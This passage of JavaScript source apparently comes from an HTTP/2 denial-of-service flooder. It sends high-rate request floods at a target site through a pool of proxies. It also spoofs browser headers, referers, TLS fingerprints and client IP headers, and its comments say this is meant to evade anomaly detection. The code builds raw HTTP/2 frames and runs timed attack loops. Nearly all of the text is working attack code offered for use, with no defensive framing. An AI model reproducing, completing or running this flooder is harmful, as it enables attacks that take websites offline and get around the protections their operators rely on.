        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        ...generateAlternativeIPHeaders(),
        "connection": "keep-alive"
    },
    // Edge on Windows
    {
        "sec-ch-ua": "\"Microsoft Edge\";v=\"119\", \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "sec-fetch-site": "none",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document",
        "accept-encoding": "gzip, deflate, br",
        ...generateAlternativeIPHeaders(),
        "accept-language": "en-US,en;q=0.9"
    }
];

// Function to generate legitimate-looking URL paths
function generateLegitPath(baseUrl, originalPath) {
    // 50% chance to use the original path from user input
    if (Math.random() < 0.5 && originalPath && originalPath !== '/') {
        // Use the original path, but occasionally add legitimate parameters
        let path = originalPath;

        // Add parameters to the original path with a 20% chance
        if (Math.random() < 0.2 && !path.includes('?')) {
            path += '?' + randomElement(COMMON_URL_PARAMS);
        }

        return path;
    }

    // Otherwise use random paths (50% of the time)
    // Parse the base URL to get the hostname
    const parsedUrl = new URL(baseUrl);
    const hostname = parsedUrl.hostname;

    // Get a random standard path
    let path = randomElement(STANDARD_URI_PATHS);

    // Add common parameters with 30% probability
    if (Math.random() < 0.3) {
        path += '?' + randomElement(COMMON_URL_PARAMS);

        // Add a second parameter with 20% probability
        if (Math.random() < 0.2) {
            path += '&' + randomElement(COMMON_URL_PARAMS);
        }
    }

    // Sometimes add site-specific paths based on hostname
    if (Math.random() < 0.4) {
        // Extract the main domain name without TLD
        const domainParts = hostname.split('.');
        let mainDomain = domainParts.length >= 2 ? domainParts[domainParts.length - 2] : hostname;

        // Clean the domain name and use it in the path
        mainDomain = mainDomain.replace(/[^a-zA-Z0-9]/g, '');

        // Add domain-specific paths
        const domainPaths = [
            `/${mainDomain}/home`,
            `/${mainDomain}-assets/main.js`,
            `/${mainDomain}/images/logo.png`,
            `/wp-content/themes/${mainDomain}/style.css`,
            `/assets/${mainDomain}/css/styles.min.css`
        ];

        path = randomElement(domainPaths);
    }

    return path;
}

// Function to get standard browser headers instead of unusual ones
function getStandardBrowserHeaders(targetHost, originalPath) {
    // Select a random header set as base
    const baseHeaderSet = {...randomElement(STANDARD_HEADER_SETS)};

    // Add required HTTP/2 pseudo-headers
    const headers = {
        ":method": "GET",
        ":authority": targetHost,
        ":scheme": "https",
        ":path": generateLegitPath(`https://${targetHost}/`, originalPath),
        ...generateAlternativeIPHeaders(),
    };

    // Add the standard headers
    Object.keys(baseHeaderSet).forEach(key => {
        headers[key] = baseHeaderSet[key];
    });

    // CRITICAL: Ensure User-Agent is always set to prevent anomaly detection
    if (!headers["user-agent"] || headers["user-agent"].trim() === "") {
        headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
    }

    // CRITICAL: Ensure Accept header is always set to prevent anomaly detection
    if (!headers["accept"] || headers["accept"].trim() === "") {
        headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8";
    }

    // CRITICAL: Add Referer with high probability to prevent anomaly detection
    if (!headers["referer"] || headers["referer"].trim() === "") {
        const refererSites = [
            "https://www.google.com/search?q=" + encodeURIComponent(targetHost),
            "https://www.facebook.com/",
            "https://www.instagram.com/",
            "https://twitter.com/",
            "https://www.linkedin.com/",
            "https://www.youtube.com/",
            "https://www.bing.com/search?q=" + encodeURIComponent(targetHost),
            "https://duckduckgo.com/?q=" + encodeURIComponent(targetHost),
            "https://www.reddit.com/",
            `https://${targetHost}/`
        ];
        headers["referer"] = randomElement(refererSites);
    }

    // Add do-not-track with 15% probability
    if (Math.random() < 0.15) {
        headers["dnt"] = "1";
    }

    return headers;
}

// Add a header validation function to check for anomalies before sending
function validateAndFixHeaders(headers) {
    const criticalHeaders = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "referer": `https://www.google.com/search?q=${encodeURIComponent(headers[":authority"] || "example.com")}`
    };

    // Ensure all critical headers exist and are not empty
    Object.keys(criticalHeaders).forEach(header => {
        if (!headers[header] || headers[header].trim() === "") {
            headers[header] = criticalHeaders[header];
        }
    });

    return headers;
}

// Updated runFlooder function
function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";

    // Store the original path from user input
    const originalPath = parsedTarget.path;

    // Generate browser fingerprint for this session
    const browserFP = generateBrowserFingerprint();

    // Get standard browser headers instead of crafting unusual ones
    const headers = getStandardBrowserHeaders(parsedTarget.host, originalPath);

    // Ensure no X-Forwarded headers that could expose the tool
    const cleanedHeaders = removeXForwardedHeaders(headers);

    // CRITICAL: Validate headers to prevent anomaly detection
    const validatedHeaders = validateAndFixHeaders(cleanedHeaders);

    // Add IP spoofing in a more subtle way
    if (Math.random() < 0.1) {
        // Use a more subtle approach - only one header type with low probability
        const legitIP = generateLegitIP();
        const subtleHeaders = {
            "true-client-ip": legitIP
        };
        Object.assign(validatedHeaders, subtleHeaders);
    }

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true);

        // Apply TCP options to make it look like a real browser
        modifyTcpOptions(connection);

        // TLS options with exact fingerprint values
        const tlsOptions = {
            port: parsedPort,
            secure: true,
            ALPNProtocols: [
                "h2",
                "http/1.1"
            ],
            ciphers: ciphers,
            sigalgs: SignalsList,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            session: null,
            minVersion: tls_versions[0],
            maxVersion: tls_versions[1]
        };

        // Create TLS connection
        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);

        // Apply TLS fingerprint by intercepting the ClientHello
        applyTLSFingerprint(tlsConn);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 10000);
        tlsConn.setMaxListeners(0);

        // HTTP/2 client state tracking
        let h2State = {
            streamIdCounter: 1,
            isConnected: false,
            sentInitialFrames: false,
            responseCount: 0,
            packetsPerSecond: 0,
            currentDelay: getRandomDelay(),
            parallelRequests: randomElement(BROWSER_TIMING.PARALLEL_REQUESTS)
        };

        // Remove fingerprint logging to prevent spam
        // Store the fingerprint information silently

        tlsConn.on('secureConnect', () => {
            // Silently establish connection without logging
        });

        // Create a raw HTTP/2 connection without the node:http2 module
        tlsConn.on('data', (data) => {
            if (!h2State.isConnected) {
                // Check for HTTP/2 connection preface
                if (data.toString().includes('HTTP/2')) {
                    h2State.isConnected = true;

                    // Send connection preface
                    tlsConn.write(Buffer.from('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'));

                    // Vary the timing slightly to appear more human-like
                    setTimeout(() => {
                        // Send initial frames in the exact order from the fingerprint
                        if (!h2State.sentInitialFrames) {
                            // 1. Send SETTINGS frame
                            tlsConn.write(createH2SettingsFrame());

                            // Wait a random time before sending WINDOW_UPDATE to mimic browser behavior
                            setTimeout(() => {
                                // 2. Send WINDOW_UPDATE frame
                                tlsConn.write(createH2WindowUpdateFrame(windowUpdateIncrement));

                                h2State.sentInitialFrames = true;

                                // Wait before starting the flood to mimic browser behavior
                                setTimeout(() => {
                                    // Start sending flood requests
                                    startFlood();
                                }, getRandomDelay());
                            }, getRandomDelay() / 2);
                        }
                    }, getRandomDelay() / 3);
                }
            }
        });

        // Function to manually craft and send HTTP/2 requests
        function startFlood() {
            // Set up memory monitoring
            const memCheckInterval = setInterval(() => {
                try {
                    checkHeapStatus();
                } catch (e) {
                    // Ignore errors in heap status check
                }
            }, 30000); // Check every 30 seconds

            // Active request counter to prevent OOM
            let activeRequests = 0;

            const attackInterval = setInterval(() => {
                try {
                    // Prevent too many concurrent requests
                    if (activeRequests >= SAFE_MEMORY_SETTINGS.MAX_CONCURRENT_REQUESTS) {
                        return; // Skip this cycle if too many active requests
                    }

                // Randomize the number of parallel requests to mimic browser behavior
                    const parallelCount = Math.min(
                        args.Rate,
                        h2State.parallelRequests,
                        SAFE_MEMORY_SETTINGS.MAX_CONCURRENT_REQUESTS - activeRequests
                    );

                for (let i = 0; i < parallelCount; i++) {
                        try {
                    const streamId = h2State.streamIdCounter;
                    h2State.streamIdCounter += 2; // Client uses odd-numbered stream IDs

                            // Generate a new path for each request - 50% chance for original path
                            validatedHeaders[":path"] = generateLegitPath(`https://${parsedTarget.host}/`, originalPath);

                            // CRITICAL: Re-validate headers before each request to ensure no anomalies
                            const requestHeaders = validateAndFixHeaders({...validatedHeaders});

                            // Validate frame size before creating it
                            const MAX_FRAME_SIZE = SAFE_MEMORY_SETTINGS.MAX_FRAME_SIZE;

                            // Track active request
                            activeRequests++;

                            // Create header frame with size validation
                    const headerFrame = createH2HeadersFrameWithEncoding(
                        requestHeaders,
                        streamId,
                        true, // endStream
                        {
                            exclusive: true,
                            dependsOn: 0,
                            weight: 256
                        }
                    );

                            // Check if frame exceeds maximum size
                            if (headerFrame && headerFrame.length <= MAX_FRAME_SIZE) {
                                try {
                                    tlsConn.write(headerFrame, () => {
                                        // Reduce active request count after write completes
                                        activeRequests--;
                                    });
                    h2State.packetsPerSecond++;
                                } catch (err) {
                                    // Handle write errors
                                    activeRequests--;
                                }
                            } else {
                                // Skip invalid frame
                                activeRequests--;
                    }
                        } catch (err) {
                            // Handle individual request errors
                            if (activeRequests > 0) activeRequests--;
                        }
                    }

                    // Occasionally optimize memory - more frequently to prevent corruption
                    if (Math.random() > 0.8) {
                        optimizeMemoryUsage();
                }
                } catch (err) {
                    // Handle interval errors
                    // Continue running even if an error occurs
                }
            }, h2State.currentDelay);

            // Clean up after time expires
            setTimeout(() => {
                clearInterval(attackInterval);
                clearInterval(memCheckInterval);
                optimizeMemoryUsage(); // Final cleanup

                // Reset active requests
                activeRequests = 0;

                try {
                tlsConn.destroy();
                connection.destroy();
                } catch (e) {
                    // Ignore errors during cleanup
                }
            }, args.time * 1000);
        }

        // Standard HTTP/2 client as backup if manual crafting fails
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: http2Settings,
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.on("connect", () => {
            // Only use the standard client if our manual implementation fails
            if (!h2State.sentInitialFrames) {
                // Remove console log to prevent spam

                // Send exact HTTP/2 frames in order
                if (client._socket) {
                    // Create and send manually crafted HTTP/2 frames with slight delays
                    setTimeout(() => {
                        const settingsFrame = createH2SettingsFrame();
                        client._socket.write(settingsFrame);

                        setTimeout(() => {
                            // Send WINDOW_UPDATE frame
                            const windowUpdateFrame = createH2WindowUpdateFrame(windowUpdateIncrement);
                            client._socket.write(windowUpdateFrame);
                        }, getRandomDelay() / 2);
                    }, getRandomDelay() / 3);
                }

                // Add browser navigation simulation after connection
                simulateBrowserNavigation(client, headers, parsedTarget);

                // Attack loop with randomized timing
                const IntervalAttack = setInterval(() => {
                    // Randomize the number of requests per batch
                    const batchSize = Math.min(args.Rate, randomElement(BROWSER_TIMING.PARALLEL_REQUESTS));

                    for (let i = 0; i < batchSize; i++) {
                        // Randomize headers for each request
                        const requestHeaders = randomizeHeaders(headers);

                        // Create request with priority settings exactly matching fingerprint
                        const request = client.request(requestHeaders, {
                            endStream: true,
                            exclusive: true,
                            parent: 0,
                            weight: 256,
                            waitForTrailers: false
                        });

                        request.on("response", response => {
                            request.close();
                            request.destroy();
                            return;
                        });

                        request.end();

                        // Add short delays between requests in the same batch
                        if (i < batchSize - 1) {
                            const shortDelay = Math.random() * 20;
                            new Promise(resolve => setTimeout(resolve, shortDelay));
                        }
                    }
                }, getRandomDelay() * 5); // Slower rate for http2 client to avoid detection
            }
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return;
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return;
        });
    });
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});

// Enable garbage collection if possible
try {
    // Enable garbage collection if running with --expose-gc
    if (typeof global.gc !== 'function') {
        console.log('Run with --expose-gc to enable garbage collection');
    }
} catch (e) {
    // Ignore if not available
}
